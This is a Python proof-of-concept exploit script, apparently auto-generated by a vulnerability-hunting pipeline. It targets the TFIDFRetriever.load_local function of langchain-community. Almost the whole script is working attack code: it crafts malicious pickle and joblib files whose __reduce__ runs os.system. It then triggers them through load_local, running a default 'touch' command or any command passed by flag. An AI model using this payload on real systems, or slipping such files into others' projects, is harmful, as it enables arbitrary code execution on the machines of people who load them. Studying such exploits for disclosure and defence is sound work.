#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-022
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_38.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in TFIDFRetriever uses joblib.load and pickle.load
on files from a user-controlled folder_path. Although there is an allow_dangerous_deserialization
guard, if the caller sets it to True (as intended for legitimate use), the code provides no
further protection. An attacker can control folder_path to point to a malicious file, leading
to arbitrary code execution when deserialized.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle/joblib file that executes a benign command (touch /tmp/poc_success.txt)
2. Calling load_local with allow_dangerous_deserialization=True and folder_path pointing to the
   attacker-controlled directory containing the malicious file.

Usage:
    python poc_exploit.py [--target /path/to/target/directory]
"""

import os
import sys
import tempfile
import argparse
import pickle
import subprocess
from pathlib import Path

# Try to import joblib - if not available, we'll use pickle only
try:
    import joblib
    HAS_JOBlIB = True
except ImportError:
    HAS_JOBlIB = False
    print("[!] joblib not installed. Will use pickle only for demonstration.")

# Import the vulnerable function
sys.path.insert(0, "/tmp/langchain-community-only")
from langchain_community.retrievers.tfidf import TFIDFRetriever


def create_malicious_pickle(filepath: Path, command: str = "touch /tmp/poc_success.txt"):
    """
    Create a malicious pickle file that executes a command when deserialized.
    
    Args:
        filepath: Path where the malicious .pkl file will be written
        command: Command to execute (default: benign touch command)
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    with open(filepath, "wb") as f:
        pickle.dump(MaliciousPayload(), f)
    
    print(f"[+] Created malicious pickle file: {filepath}")


def create_malicious_joblib(filepath: Path, command: str = "touch /tmp/poc_success.txt"):
    """
    Create a malicious joblib file that executes a command when deserialized.
    
    Args:
        filepath: Path where the malicious .joblib file will be written
        command: Command to execute (default: benign touch command)
    """
    if not HAS_JOBlIB:
        print("[!] Skipping joblib file creation (joblib not available)")
        return
    
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    # joblib.load uses pickle under the hood, so we can create a malicious pickle
    # and save it with joblib.dump
    joblib.dump(MaliciousPayload(), filepath)
    print(f"[+] Created malicious joblib file: {filepath}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community-only's load_local function"
    )
    parser.add_argument(
        "--target",
        default=None,
        help="Target directory to place malicious files (default: temporary directory)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--file-name",
        default="tfidf_vectorizer",
        help="File name to use (default: tfidf_vectorizer)"
    )
    args = parser.parse_args()
    
    # Create a temporary directory for the malicious files if no target specified
    if args.target:
        target_dir = Path(args.target)
        target_dir.mkdir(parents=True, exist_ok=True)
    else:
        target_dir = Path(tempfile.mkdtemp(prefix="poc_exploit_"))
    
    print(f"[*] Using target directory: {target_dir}")
    print(f"[*] Command to execute: {args.command}")
    print(f"[*] File name: {args.file_name}")
    
    # Create malicious files
    pkl_path = target_dir / f"{args.file_name}.pkl"
    joblib_path = target_dir / f"{args.file_name}.joblib"
    
    create_malicious_pickle(pkl_path, args.command)
    create_malicious_joblib(joblib_path, args.command)
    
    # Verify files exist
    if not pkl_path.exists():
        print(f"[!] Failed to create {pkl_path}")
        sys.exit(1)
    
    print(f"[*] Files created successfully. Attempting to trigger deserialization...")
    
    # Attempt to trigger the vulnerability by calling load_local
    # Note: This will likely fail because load_local expects specific data structures
    # (vectorizer, docs, tfidf_array) that our malicious payload doesn't provide.
    # However, the deserialization happens BEFORE the data structure validation,
    # so the command should execute during deserialization.
    try:
        retriever = TFIDFRetriever.load_local(
            folder_path=str(target_dir),
            allow_dangerous_deserialization=True,
            file_name=args.file_name
        )
        print(f"[+] load_local completed successfully (unexpected)")
    except Exception as e:
        # The command should have executed before the exception
        print(f"[*] load_local raised an exception (expected): {type(e).__name__}: {e}")
    
    # Check if the command was executed
    if args.command == "touch /tmp/poc_success.txt":
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Command executed! /tmp/poc_success.txt was created.")
            print("[*] This demonstrates arbitrary code execution via deserialization.")
            # Clean up
            os.remove("/tmp/poc_success.txt")
        else:
            print("[!] Command may not have executed. Check /tmp/poc_success.txt")
    else:
        print(f"[*] Custom command was: {args.command}")
        print("[*] Check if the command was executed successfully.")
    
    # Clean up temporary directory if we created it
    if not args.target:
        import shutil
        shutil.rmtree(target_dir)
        print(f"[*] Cleaned up temporary directory: {target_dir}")


if __name__ == "__main__":
    main()
